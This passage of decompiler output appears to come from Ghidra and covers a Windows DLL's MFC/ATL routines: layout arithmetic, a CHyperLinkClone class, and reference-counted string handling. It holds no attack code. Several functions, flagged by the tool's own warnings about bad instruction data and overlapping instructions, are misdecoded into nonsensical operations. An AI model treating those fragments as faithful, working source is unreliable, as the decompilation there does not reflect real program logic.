        uStack_68 = uStack_104;
        local_64 = local_100;
        uStack_60 = uStack_fc;
        uStack_5c = uStack_f8;
        uStack_58 = uStack_f4;
        local_54 = local_f0;
        uStack_50 = uStack_ec;
        uStack_4c = uStack_e8;
        uStack_48 = uStack_e4;
        local_44 = local_e0;
        FUN_10434e01(param_1[0xc],&local_74);
        do {
                    /* WARNING: Do nothing block with infinite loop */
        } while( true );
      }
    }
  }
  if (piVar1 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar1;
    *piVar1 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar1);
    }
  }
  FUN_100579df();
  return;
}



/* Function: FUN_100297a0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void __thiscall
FUN_100297a0(int *param_1,int *param_2,int *param_3,int *param_4,int *param_5,int param_6)

{
  int iVar1;
  bool bVar2;
  bool bVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  double dVar11;
  float fVar12;
  int iStack_34;
  int iStack_20;
  
  FUN_10354c76(param_1,param_2,-*param_1,-param_1[1]);
  if (param_6 != 0) {
    iVar4 = *param_2;
    if (param_1[2] < *param_2) {
      iVar4 = param_1[2];
    }
    param_1[2] = iVar4;
    iVar4 = param_2[1];
    if (param_1[3] < param_2[1]) {
      iVar4 = param_1[3];
    }
    param_1[3] = iVar4;
    iVar4 = param_2[2];
    if (param_2[2] < param_1[4]) {
      iVar4 = param_1[4];
    }
    param_1[4] = iVar4;
    iVar4 = param_2[3];
    if (param_2[3] < param_1[5]) {
      iVar4 = param_1[5];
    }
    param_1[5] = iVar4;
    if (param_6 == 1) {
      *param_5 = 0;
    }
    iVar4 = param_2[2] - *param_2;
    if (iVar4 < 0) {
      iVar4 = 0;
    }
    iVar7 = param_2[3] - param_2[1];
    iStack_34 = 1;
    if (iVar7 < 1) {
      iVar7 = 1;
    }
    iVar6 = param_3[1];
    iVar5 = iVar4 - *param_3;
    if (iVar4 - *param_3 < 0) {
      iVar5 = 0;
    }
    iVar8 = iVar7 - iVar6;
    if (iVar7 - iVar6 < 0) {
      iVar8 = 0;
    }
    if (iVar6 != 0) {
      iStack_34 = iVar7 / iVar6;
      iVar8 = iVar7 % iVar6;
      if (1 < iStack_34) {
        iVar5 = 0;
      }
    }
    if (iVar5 < 0x14) {
      iVar5 = 0x14;
    }
    if (iVar8 < 8) {
      iVar8 = 8;
    }
    if (param_6 == 2) {
      *param_2 = *param_2 + *param_5;
    }
    bVar2 = false;
    iVar6 = param_4[1];
    if ((iVar7 < iVar6) && (0 < *param_4)) {
      bVar2 = true;
    }
    bVar3 = false;
    iVar1 = *param_4;
    if (((double)iVar4 < ((double)iVar1 * _DAT_1008c3e0) / (double)iStack_34) || (bVar2)) {
      bVar3 = true;
    }
    iVar9 = iVar7;
    iVar10 = iVar4;
    if (bVar3) {
      dVar11 = (double)(((float)iVar1 * (float)iVar6) /
                       ((float)(iVar4 - iVar5) * (float)(iVar7 - iVar8)));
      __libm_sse2_sqrt_precise();
      fVar12 = ((float)(int)((double)(((float)iVar7 * (float)dVar11) / (float)iVar6) + DAT_1008c3d8)
               * (float)iVar6) / (float)iVar7;
      if ((iStack_34 != 1) || (DAT_1008c3e8 <= (double)(float)dVar11)) {
        iVar9 = (int)((float)(iVar7 - iVar8) * fVar12 + (float)iVar8);
        iVar10 = (int)((float)(iVar4 - iVar5) * fVar12 + (float)iVar5);
      }
      else {
        iVar10 = iVar1 + iVar5;
      }
    }
    iVar6 = *param_2 + iVar10;
    param_2[2] = iVar6;
    if (iVar6 < *(int *)(iStack_20 + 0x10)) {
      iVar6 = *(int *)(iStack_20 + 0x10);
    }
    *(int *)(iStack_20 + 0x10) = iVar6;
    if (param_6 == 1) {
      iVar6 = param_5[1];
    }
    else {
      iVar6 = *(int *)(iStack_20 + 0x3c);
    }
    param_2[1] = param_2[1] + iVar6;
    iVar6 = param_2[1] + iVar9;
    param_2[3] = iVar6;
    if (iVar6 < *(int *)(iStack_20 + 0x14)) {
      iVar6 = *(int *)(iStack_20 + 0x14);
    }
    iVar9 = iVar9 - iVar7;
    *(int *)(iStack_20 + 0x14) = iVar6;
    *param_5 = iVar10 - iVar4;
    if (param_6 == 2) {
      if (iVar9 < param_5[1]) {
        iVar9 = param_5[1];
      }
      param_5[1] = iVar9;
      return;
    }
    *(int *)(iStack_20 + 0x3c) = param_5[1];
    param_5[1] = iVar9;
  }
  return;
}



/* Function: FUN_10029ab0 */

void __fastcall FUN_10029ab0(int *param_1)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 uVar4;
  code *unaff_ESI;
  code *pcVar5;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 uStack_1c;
  int iStack_18;
  int iStack_14;
  ulonglong local_10;
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_10 = 0;
  iVar2 = FUN_10319ba8(&stack0xfffffffc);
  param_1[3] = iVar2;
  iVar2 = param_1[1];
  local_20 = 7;
  if ((*(byte *)(param_1 + 0xf) & 0x20) != 0) {
    local_20 = 0xf;
  }
  param_1[2] = 1;
  iVar1 = *param_1;
  iStack_14 = param_1[8];
  *param_1 = 0;
  param_1[1] = 0;
  local_24 = 0x1c;
  uStack_1c = 0;
  iStack_18 = 0;
  local_10 = local_10 & 0xffffffff00000000;
  (*unaff_ESI)(*(undefined4 *)param_1[0x10],0,&local_24,1);
  local_20 = 7;
  if ((*(byte *)(param_1 + 0xf) & 0x10) != 0) {
    local_20 = 0xf;
  }
  iStack_18 = param_1[3] + -1;
  local_24 = 0x1c;
  iStack_14 = param_1[9];
  local_10 = (ulonglong)(uint)param_1[1];
  uStack_1c = 0;
  pcVar5 = *(code **)param_1[0x10];
  (*unaff_ESI)(pcVar5,1,&local_24,1);
  if (((*(byte *)(param_1 + 0xf) & 1) != 0) && ((iVar1 != 0 || (iVar2 != 0)))) {
    puVar3 = (undefined4 *)FUN_1068608d();
    for (unaff_ESI = (code *)(*pcVar5)(*puVar3,5); unaff_ESI != (code *)0x0;
        unaff_ESI = (code *)(*pcVar5)(unaff_ESI,2)) {
      iStack_18 = 0;
      iStack_14 = 0;
      local_10 = 0;
      FUN_104e13ef(pcVar5,unaff_ESI,&iStack_18);
      uVar4 = FUN_1051c7dd(0,*(undefined4 *)param_1[0x10],&iStack_18,1);
      *(uint *)((int)param_1 + 0x4503f045) = *(uint *)((int)param_1 + 0x4503f045) | 0xffffffdc;
      FUN_1059666a(param_1,unaff_ESI,0,iStack_18 + iVar1,uVar4,0,0,0x15);
    }
  }
  iVar2 = param_1[2] / 100;
  if (iVar2 < 1) {
    iVar2 = 1;
  }
  param_1[4] = iVar2;
  iVar2 = param_1[3] / 100;
  if (iVar2 < 1) {
    iVar2 = 1;
  }
  param_1[5] = iVar2;
  iVar2 = param_1[2] / 10;
  if (iVar2 < 1) {
    iVar2 = 1;
  }
  param_1[6] = iVar2;
  iVar2 = param_1[3] / 10;
  if (iVar2 < 1) {
    iVar2 = 1;
  }
  param_1[7] = iVar2;
  FUN_100ae5c2(unaff_ESI,*(undefined4 *)param_1[0x10],0,1);
  FUN_100579df();
  return;
}



/* Function: FUN_10029ca0 */

uint __thiscall FUN_10029ca0(int param_1,uint *param_2,uint *param_3)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  
  uVar1 = *param_3;
  uVar3 = *param_2;
  uVar4 = *(int *)(param_1 + 8) - *(int *)(param_1 + 0x20);
  if ((int)uVar4 < (int)uVar3) {
    uVar2 = 0;
    if (-1 < (int)uVar4) {
      uVar2 = uVar4;
    }
    *param_2 = uVar2;
  }
  else if ((int)uVar3 < 0) {
    *param_2 = 0;
  }
  uVar4 = *(int *)(param_1 + 0xc) - *(int *)(param_1 + 0x24);
  if ((int)uVar4 < (int)*param_3) {
    uVar2 = 0;
    if (-1 < (int)uVar4) {
      uVar2 = uVar4;
    }
    *param_3 = uVar2;
  }
  else if ((int)*param_3 < 0) {
    *param_3 = 0;
  }
  if ((*param_2 == uVar3) && (uVar3 = uVar1, *param_3 == uVar1)) {
    return uVar1 & 0xffffff00;
  }
  return CONCAT31((int3)(uVar3 >> 8),1);
}



/* Function: FUN_10029d20 */

undefined4 __thiscall
FUN_10029d20(int param_1,undefined4 param_2,int param_3,undefined4 param_4,undefined4 param_5,
            undefined4 *param_6,int param_7)

{
  undefined4 uVar1;
  undefined4 uVar2;
  
  if (param_7 == 0) {
    if (param_3 == 0xf) {
      uVar1 = FUN_1002a030();
      *param_6 = uVar1;
      return 1;
    }
    if (param_3 == 0x14) {
      *param_6 = 1;
      return 1;
    }
    if (param_3 == 0x200) {
      FUN_103c1d7e(0x200,*(undefined4 *)(param_1 + 0x2c));
      *param_6 = 0;
      return 1;
    }
    if (param_3 == 0x21) {
      uVar2 = 1;
      uVar1 = 0;
      *(undefined4 *)(param_1 + 0x38) = 1;
      FUN_1014134d(param_1,*(undefined4 *)(param_1 + 4));
      FUN_1029ff13(*(undefined4 *)(param_1 + 4),uVar1,uVar2);
      uVar1 = FUN_1043f4aa();
      *param_6 = uVar1;
      return 1;
    }
  }
  return 0;
}



/* Function: FUN_10029de0 */

undefined4 * __thiscall FUN_10029de0(undefined4 *param_1,undefined4 param_2)

{
  code *pcVar1;
  undefined4 uVar2;
  int *piVar3;
  int iVar4;
  undefined4 *puVar5;
  
  uVar2 = DAT_10079430;
  param_1[1] = 0;
  param_1[5] = 0;
  param_1[8] = uVar2;
  param_1[6] = 0;
  param_1[7] = 0;
  *param_1 = CHyperLinkClone::vftable;
  param_1[9] = param_2;
  param_1[10] = 0;
  uVar2 = FUN_103149cb(0,0x7f89);
  param_1[0xb] = uVar2;
  piVar3 = (int *)FUN_100080e0();
  if (piVar3 == (int *)0x0) {
    FUN_10007f20(0x80004005);
  }
  else {
    iVar4 = (**(code **)(*piVar3 + 0xc))();
    param_1[0xc] = iVar4 + 0x10;
    piVar3 = (int *)FUN_100080e0();
    if (piVar3 != (int *)0x0) {
      iVar4 = (**(code **)(*piVar3 + 0xc))();
      param_1[0xd] = iVar4 + 0x10;
      param_1[0xe] = 0;
      param_1[0xf] = 0xe2e2e2;
      param_1[0x10] = 0;
      param_1[0x11] = 0;
      FUN_105f9b94(&DAT_10096810);
      return param_1;
    }
  }
  FUN_10007f20(0x80004005);
  pcVar1 = (code *)swi(3);
  puVar5 = (undefined4 *)(*pcVar1)();
  return puVar5;
}



/* Function: FUN_10029eb0 */

undefined4 __thiscall FUN_10029eb0(undefined4 param_1,byte param_2)

{
  FUN_10029ee0();
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_10029ee0 */

void __fastcall FUN_10029ee0(undefined4 *param_1)

{
  int *piVar1;
  int iVar2;
  undefined4 *puVar3;
  
  *param_1 = CHyperLinkClone::vftable;
  FUN_10452eeb();
  if (param_1[0x11] != 0) {
    FUN_10176a40(param_1[0x11]);
    param_1[0x11] = 0;
  }
  puVar3 = (undefined4 *)(param_1[0xd] + -0x10);
  piVar1 = (int *)(param_1[0xd] + -4);
  LOCK();
  iVar2 = *piVar1;
  *piVar1 = *piVar1 + -1;
  UNLOCK();
  if (iVar2 == 1 || iVar2 + -1 < 0) {
    (**(code **)(*(int *)*puVar3 + 4))(puVar3);
  }
  puVar3 = (undefined4 *)(param_1[0xc] + -0x10);
  piVar1 = (int *)(param_1[0xc] + -4);
  LOCK();
  iVar2 = *piVar1;
  *piVar1 = *piVar1 + -1;
  UNLOCK();
  if (iVar2 == 1 || iVar2 + -1 < 0) {
    (**(code **)(*(int *)*puVar3 + 4))(puVar3);
  }
  if (param_1[5] != 0) {
    FUN_10057944(param_1[5]);
  }
  return;
}



/* Function: FUN_10029f60 */

void __thiscall FUN_10029f60(int param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  int *piVar5;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10076058;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_8 = 0;
  *(undefined4 *)(param_1 + 0x40) = 0;
  iVar2 = *(int *)(param_1 + 0x30);
  piVar5 = (int *)(iVar2 + -0x10);
  if ((int *)(param_2 + -0x10) != piVar5) {
    if ((*(int *)(iVar2 + -4) < 0) || (*(int *)(param_2 + -0x10) != *piVar5)) {
      FUN_1002a200(param_2,*(undefined4 *)(param_2 + -0xc));
    }
    else {
      iVar4 = FUN_1002a330(uVar3);
      piVar1 = (int *)(iVar2 + -4);
      LOCK();
      iVar2 = *piVar1;
      *piVar1 = *piVar1 + -1;
      UNLOCK();
      if (iVar2 == 1 || iVar2 + -1 < 0) {
        (**(code **)(*(int *)*piVar5 + 4))(piVar5);
      }
      *(int *)(param_1 + 0x30) = iVar4 + 0x10;
    }
  }
  local_8 = 0xffffffff;
  piVar5 = (int *)(param_2 + -4);
  LOCK();
  iVar2 = *piVar5;
  *piVar5 = *piVar5 + -1;
  UNLOCK();
  if (iVar2 == 1 || iVar2 + -1 < 0) {
    (**(code **)(**(int **)(param_2 + -0x10) + 4))((undefined4 *)(param_2 + -0x10));
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_1002a030 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Instruction at (ram,0x1002a0d4) overlaps instruction at (ram,0x1002a0d3)
    */

void __fastcall FUN_1002a030(int param_1)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  int iVar4;
  undefined4 extraout_ECX;
  int unaff_EDI;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined1 *puVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  code *pcVar11;
  undefined4 uStack_90;
  undefined1 *puVar12;
  undefined1 auStack_6c [8];
  int local_64;
  undefined4 local_60;
  undefined4 uStack_5c;
  undefined4 uStack_58;
  undefined4 uStack_54;
  undefined1 local_50 [68];
  uint local_c;
  
  pcVar11 = (code *)&stack0xfffffffc;
  local_c = DAT_100956e0 ^ (uint)auStack_6c;
  iVar4 = *(int *)(param_1 + 4);
  local_60 = 0;
  uStack_5c = 0;
  uStack_58 = 0;
  uStack_54 = 0;
  local_64 = param_1;
  iVar1 = FUN_10531ef2();
  puVar12 = auStack_6c;
  uStack_90 = 0x1002a077;
  FUN_1021987c(*(undefined4 *)(param_1 + 4),puVar12);
  if (*(int *)(param_1 + 0x40) != 1) {
    uStack_90 = 1;
  }
  FUN_1053118a(&stack0xfffffffc,iVar1 + 1);
  iVar2 = FUN_1016eee9();
  uVar3 = (*pcVar11)(iVar2,*(undefined4 *)(unaff_EDI + 0x28));
  puVar7 = local_50 + -unaff_EDI;
  uVar10 = 0xcc0020;
  uVar9 = 0;
  uVar8 = 0;
  iVar4 = iVar4 - (int)puVar12;
  uVar6 = 0;
  uVar5 = 0;
  iVar1 = iVar2;
  FUN_10589aad(&stack0xfffffffc);
  (*pcVar11)(iVar2,uVar3,uStack_90,uVar5,uVar6,iVar4,puVar7,iVar1,uVar8,uVar9,uVar10);
  FUN_1034be10(iVar2);
  *(undefined4 *)(iVar2 + -0x14ebdba4) = extraout_ECX;
  FUN_104bf4d7();
  FUN_1035562d();
  (*pcVar11)(uVar3);
  uVar3 = 0xff0000;
  if (*(int *)(iVar2 + 0x38) != 0) {
    uVar3 = 0x960000;
  }
  FUN_1037c8db(uStack_90,uVar3);
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: FUN_1002a170 */

void __fastcall FUN_1002a170(int *param_1)

{
  undefined4 *puVar1;
  int *piVar2;
  int *piVar3;
  code *pcVar4;
  int iVar5;
  
  iVar5 = *param_1;
  puVar1 = (undefined4 *)(iVar5 + -0x10);
  piVar3 = (int *)*puVar1;
  if (*(int *)(iVar5 + -0xc) != 0) {
    piVar2 = (int *)(iVar5 + -4);
    if (*(int *)(iVar5 + -4) < 0) {
      if (-1 < *(int *)(iVar5 + -8)) {
        *(undefined4 *)(iVar5 + -0xc) = 0;
        *(undefined2 *)*param_1 = 0;
        return;
      }
      FUN_10007f20(0x80070057);
      pcVar4 = (code *)swi(3);
      (*pcVar4)();
      return;
    }
    LOCK();
    iVar5 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar5 == 1 || iVar5 + -1 < 0) {
      (**(code **)(*(int *)*puVar1 + 4))(puVar1);
    }
    iVar5 = (**(code **)(*piVar3 + 0xc))();
    *param_1 = iVar5 + 0x10;
  }
  return;
}



/* Function: FUN_1002a1d0 */

code * FUN_1002a1d0(void)

{
  return FUN_1002a470;
}



/* Function: FUN_1002a1e0 */

void __fastcall FUN_1002a1e0(int *param_1)

{
  int *piVar1;
  int iVar2;
  undefined4 *puVar3;
  
  puVar3 = (undefined4 *)(*param_1 + -0x10);
  piVar1 = (int *)(*param_1 + -4);
  LOCK();
  iVar2 = *piVar1;
  *piVar1 = *piVar1 + -1;
  UNLOCK();
  if (iVar2 == 1 || iVar2 + -1 < 0) {
    (**(code **)(*(int *)*puVar3 + 4))(puVar3);
  }
  return;
}



/* Function: FUN_1002a200 */

void __thiscall FUN_1002a200(int *param_1,void *param_2,int param_3)

{
  int iVar1;
  uint uVar2;
  void *_Dst;
  code *pcVar3;
  uint uVar4;
  
  if (param_3 == 0) {
    FUN_1002a170();
    return;
  }
  if (param_2 != (void *)0x0) {
    iVar1 = *param_1;
    uVar2 = *(uint *)(iVar1 + -0xc);
    uVar4 = (int)param_2 - iVar1 >> 1;
    if (param_3 < 0) goto LAB_1002a2a6;
    if ((int)(1U - *(int *)(iVar1 + -4) | *(int *)(iVar1 + -8) - param_3) < 0) {
      FUN_1002a2c0(param_3);
    }
    _Dst = (void *)*param_1;
    if (uVar2 < uVar4) {
      _memcpy_s(_Dst,*(int *)((int)_Dst + -8) * 2,param_2,param_3 * 2);
    }
    else {
      _memmove_s(_Dst,*(int *)((int)_Dst + -8) * 2,(void *)((int)_Dst + uVar4 * 2),param_3 * 2);
    }
    if (param_3 <= *(int *)(*param_1 + -8)) {
      *(int *)(*param_1 + -0xc) = param_3;
      *(undefined2 *)(param_3 * 2 + *param_1) = 0;
      return;
    }
  }
  FUN_10007f20(0x80070057);
LAB_1002a2a6:
  FUN_10007f20(0x80070057);
  pcVar3 = (code *)swi(3);
  (*pcVar3)();
  return;
}



/* Function: FUN_1002a2c0 */

void __thiscall FUN_1002a2c0(CSimpleStringT<wchar_t,0> *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  
  iVar2 = *(int *)param_1;
  if (param_2 < *(int *)(iVar2 + -0xc)) {
    param_2 = *(int *)(iVar2 + -0xc);
  }
  if (1 < *(int *)(iVar2 + -4)) {
    FUN_1002a3b0(param_2);
    return;
  }
  iVar2 = *(int *)(iVar2 + -8);
  if (iVar2 < param_2) {
    if (0x40000000 < iVar2) {
      iVar1 = iVar2 + 0x100000;
      if (iVar2 + 0x100000 < param_2) {
        iVar1 = param_2;
      }
      ATL::CSimpleStringT<wchar_t,0>::Reallocate(param_1,iVar1);
      return;
    }
    iVar2 = iVar2 + iVar2 / 2;
    if (iVar2 < param_2) {
      iVar2 = param_2;
    }
    ATL::CSimpleStringT<wchar_t,0>::Reallocate(param_1,iVar2);
  }
  return;
}



/* Function: FUN_1002a330 */

int * __fastcall FUN_1002a330(int *param_1)

{
  rsize_t _DstSize;
  code *pcVar1;
  undefined4 *puVar2;
  int *piVar3;
  
  puVar2 = (undefined4 *)(**(code **)(*(int *)*param_1 + 0x10))();
  if ((-1 < param_1[3]) && (puVar2 == (undefined4 *)*param_1)) {
    LOCK();
    param_1[3] = param_1[3] + 1;
    UNLOCK();
    return param_1;
  }
  piVar3 = (int *)(**(code **)*puVar2)(param_1[1],2);
  if (piVar3 != (int *)0x0) {
    piVar3[1] = param_1[1];
    _DstSize = param_1[1] * 2 + 2;
    _memcpy_s(piVar3 + 4,_DstSize,param_1 + 4,_DstSize);
    return piVar3;
  }
  FUN_1002a3a0();
  pcVar1 = (code *)swi(3);
  piVar3 = (int *)(*pcVar1)();
  return piVar3;
}



/* Function: FUN_1002a3a0 */

void FUN_1002a3a0(void)

{
  code *pcVar1;
  
  FUN_10007f20(0x8007000e);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: FUN_1002a3b0 */

void __thiscall FUN_1002a3b0(undefined4 *param_1,int param_2)

{
  int *piVar1;
  void *_Src;
  int iVar2;
  code *pcVar3;
  rsize_t _DstSize;
  undefined4 *puVar4;
  int iVar5;
  undefined4 *puVar6;
  
  _Src = (void *)*param_1;
  puVar6 = (undefined4 *)((int)_Src + -0x10);
  iVar2 = *(int *)((int)_Src + -0xc);
  puVar4 = (undefined4 *)(**(code **)(*(int *)*puVar6 + 0x10))();
  iVar5 = (**(code **)*puVar4)(param_2,2);
  if (iVar5 != 0) {
    if (iVar2 < param_2) {
      param_2 = iVar2;
    }
    _DstSize = (param_2 + 1) * 2;
    _memcpy_s((void *)(iVar5 + 0x10),_DstSize,_Src,_DstSize);
    *(int *)(iVar5 + 4) = iVar2;
    piVar1 = (int *)((int)_Src + -4);
    LOCK();
    iVar2 = *piVar1;
    *piVar1 = *piVar1 + -1;
    UNLOCK();
    if (iVar2 == 1 || iVar2 + -1 < 0) {
      (**(code **)(*(int *)*puVar6 + 4))(puVar6);
    }
    *param_1 = (void *)(iVar5 + 0x10);
    return;
  }
  FUN_1002a3a0();
  pcVar3 = (code *)swi(3);
  (*pcVar3)();
  return;
}



/* Function: Reallocate */

/* Library Function - Single Match
    private: void __thiscall ATL::CSimpleStringT<wchar_t,0>::Reallocate(int)
   
   Library: Visual Studio 2012 Release */

void __thiscall
ATL::CSimpleStringT<wchar_t,0>::Reallocate(CSimpleStringT<wchar_t,0> *this,int param_1)

{
  code *pcVar1;
  int iVar2;
  undefined4 *puVar3;
  
  puVar3 = (undefined4 *)(*(int *)this + -0x10);
  if ((*(int *)(*(int *)this + -8) < param_1) && (0 < param_1)) {
    iVar2 = (**(code **)(*(int *)*puVar3 + 8))(puVar3,param_1,2);
    if (iVar2 != 0) {
      *(int *)this = iVar2 + 0x10;
      return;
    }
  }
  FUN_1002a3a0();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: FUN_1002a470 */

/* WARNING: Instruction at (ram,0x1002a551) overlaps instruction at (ram,0x1002a550)
    */

undefined4 FUN_1002a470(int *param_1,int param_2,int param_3,undefined4 param_4)

{
  int *piVar1;
  undefined4 *puVar2;
  int iVar3;
  int iVar4;
  undefined3 uVar5;
  int iVar6;
  undefined4 uVar7;
  uint uVar8;
  int extraout_ECX;
  undefined1 *puVar9;
  undefined1 *puVar10;
  int *piVar11;
  undefined4 local_28;
  int local_24;
  undefined4 local_20;
  undefined4 local_1c;
  int local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  iVar4 = param_3;
  iVar3 = param_2;
  piVar11 = param_1;
  puVar9 = &stack0xfffffffc;
  local_28 = param_1[1];
  iVar6 = param_1[6];
  piVar1 = param_1 + 1;
  param_1[6] = (int)&local_28;
  puVar2 = (undefined4 *)*param_1;
  local_c = 0x24;
  local_8 = 1;
  local_24 = param_2;
  local_20 = param_3;
  local_1c = param_4;
  local_18 = 0;
  local_10 = 0;
  local_14 = 0;
  param_1 = (int *)0x0;
  param_2 = iVar6;
  iVar6 = (*(code *)*puVar2)(*piVar1,iVar3,param_3,param_4,&param_1,0);
  uVar7 = local_c;
  if (iVar6 == 0) {
    local_8._0_3_ = (undefined3)((uint)iVar4 >> 8);
    uVar5 = (undefined3)local_8;
    local_c._0_3_ = (undefined3)((uint)iVar3 >> 8);
    if (iVar3 != 0x82) {
      local_8 = CONCAT13((char)param_4,(undefined3)local_8);
      local_c = CONCAT13((char)iVar4,(undefined3)local_c);
      local_10._0_3_ = (undefined3)((uint)piVar11[1] >> 8);
      local_10 = CONCAT13((char)iVar3,(undefined3)local_10);
      local_14._0_3_ = (undefined3)((uint)piVar11[8] >> 8);
      local_14 = CONCAT13((char)piVar11[1],(undefined3)local_14);
      local_18 = piVar11[8] << 0x18;
      local_20 = CONCAT13(0xfa,(undefined3)local_20);
      local_1c = 0x1002a4;
      param_1 = (int *)FUN_1038824e();
      goto LAB_1002a550;
    }
    local_8._3_1_ = 0x82;
    local_c._0_3_ = (undefined3)uVar7;
    local_c = CONCAT13(5,(undefined3)local_c);
    local_8._0_3_ = 0x1002a5;
    FUN_1041b221();
    local_8 = CONCAT13(local_8._3_1_,0xffffff);
    local_10._3_1_ = (undefined1)piVar11[1];
    local_c._0_3_ = (undefined3)((uint)piVar11[1] >> 8);
    local_c = CONCAT13(0xfc,(undefined3)local_c);
    local_14 = CONCAT13(0xc,(undefined3)local_14);
    local_10._0_3_ = 0x1002a5;
    param_3 = (*(code *)0x82)();
    local_10._0_3_ = (undefined3)((uint)param_4 >> 8);
    local_14 = CONCAT13((char)param_4,uVar5);
    local_18 = iVar4 << 0x18;
    local_1c = CONCAT13(0x82,(int3)((uint)piVar11[1] >> 8));
    local_20._0_3_ = (undefined3)((uint)piVar11[8] >> 8);
    local_20 = CONCAT13((char)piVar11[1],(undefined3)local_20);
    local_24._0_3_ = (undefined3)((uint)&stack0xfffffffc >> 8);
    local_24 = CONCAT13((char)piVar11[8],(undefined3)local_24);
    local_28 = CONCAT13((char)&stack0xfffffffc,0x1002a5);
    param_1 = (int *)FUN_1040214e();
    if (piVar11[8] == DAT_10079430) {
LAB_1002a54c:
      piVar11[7] = piVar11[7] | 1;
      goto LAB_1002a550;
    }
    local_8._0_3_ = (undefined3)((uint)piVar11[1] >> 8);
    local_8 = CONCAT13(0xfc,(undefined3)local_8);
    local_10 = CONCAT13(0x39,(undefined3)local_10);
    local_c = CONCAT13((char)piVar11[1],0x1002a5);
    iVar6 = (*(code *)0x82)();
    if (iVar6 != param_3) goto LAB_1002a54c;
    iVar6 = piVar11[8];
    local_8._3_1_ = (undefined1)iVar6;
    local_8._0_3_ = 0xffffff;
    local_c._0_3_ = (undefined3)((uint)piVar11[1] >> 8);
    local_c = CONCAT13(0xfc,(undefined3)local_c);
    local_14 = CONCAT13(0x4b,(undefined3)local_14);
    local_10 = CONCAT13((char)piVar11[1],0x1002a5);
    uVar7 = FUN_1042eaab();
    piVar11 = (int *)((int)piVar11 + 1);
    uVar8 = CONCAT31((int3)((uint)uVar7 >> 8),
                     ((byte)uVar7 + 0x75) - (*(byte *)(iVar4 + -0x74fee3b2) < (byte)uVar7)) | 0xa8;
    iRam00000007 = iRam00000007 + (int)piVar11;
    puVar9 = (undefined1 *)CONCAT31((int3)((uint)iVar6 >> 8),local_8._3_1_);
    iVar6 = extraout_ECX;
  }
  else {
LAB_1002a550:
    uVar8 = piVar11[7];
    iVar6 = param_2;
    puVar10 = &stack0xfffffffc;
    if ((uVar8 & 1) == 0) goto LAB_1002a581;
  }
  puVar10 = puVar9;
  if (iVar6 == 0) {
    iVar6 = piVar11[1];
    piVar11[7] = uVar8 & 0xfffffffe;
    piVar11[1] = 0;
    piVar11[6] = 0;
    local_c = CONCAT13(0x75,(undefined3)local_c);
    local_8 = CONCAT13((char)iVar6,0x1002a5);
    (**(code **)(*piVar11 + 0xc))();
    return *(undefined4 *)(puVar9 + 8);
  }
LAB_1002a581:
  uVar7 = *(undefined4 *)(puVar10 + 8);
  piVar11[6] = iVar6;
  return uVar7;
}



/* Function: FUN_1002a590 */

undefined4 * __thiscall FUN_1002a590(undefined4 *param_1,byte param_2)

{
  *param_1 = &PTR_FUN_10087530;
  (*DAT_10079270)(param_1[10]);
  *param_1 = &PTR_FUN_10087524;
  FUN_104de962(param_1[5]);
  DAT_10096608 = 1;
  DAT_1009ad20 = 0;
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_1002a5e0 */

void __fastcall FUN_1002a5e0(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_10087530;
  (*DAT_10079270)(param_1[10]);
  *param_1 = &PTR_FUN_10087524;
  FUN_10355c40();
  DAT_10096608 = 1;
  DAT_1009ad20 = 0;
  return;
}



/* Function: FUN_1002a620 */

int __fastcall FUN_1002a620(int param_1)

{
  byte *pbVar1;
  char *pcVar2;
  undefined1 *puVar3;
  byte bVar4;
  uint *puVar5;
  int iVar6;
  char extraout_CH;
  byte bVar7;
  uint uVar8;
  int unaff_EBX;
  undefined1 in_PF;
  undefined8 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  int local_8;
  
  DAT_1009686c = 100;
  local_8 = param_1;
  uVar9 = FUN_104d512f(*(undefined4 *)(param_1 + 0x14),0x450);
  uVar8 = (uint)((ulonglong)uVar9 >> 0x20);
  puVar5 = (uint *)uVar9;
  if (!(bool)in_PF) {
    puVar3 = (undefined1 *)(unaff_EBX + 0x68 + uVar8);
    *puVar3 = *puVar3;
    pcVar2 = (char *)((int)puVar5 * 2 + 0x6a);
    *pcVar2 = *pcVar2 + (char)((ulonglong)uVar9 >> 8);
    *(char *)((int)puVar5 + 1) = *(char *)((int)puVar5 + 1) + extraout_CH;
    pbVar1 = (byte *)((int)puVar5 + -1);
    bVar4 = *pbVar1;
    bVar7 = (byte)((ulonglong)uVar9 >> 0x20);
    *pbVar1 = *pbVar1 + bVar7;
    uVar11 = 0x450;
    uVar10 = *(undefined4 *)(param_1 + 0x14);
    iVar6 = FUN_103f0c1f((char *)((int)puVar5 + (int)&DAT_10079420 + (uint)CARRY1(bVar4,bVar7)));
    if (iVar6 != 0) {
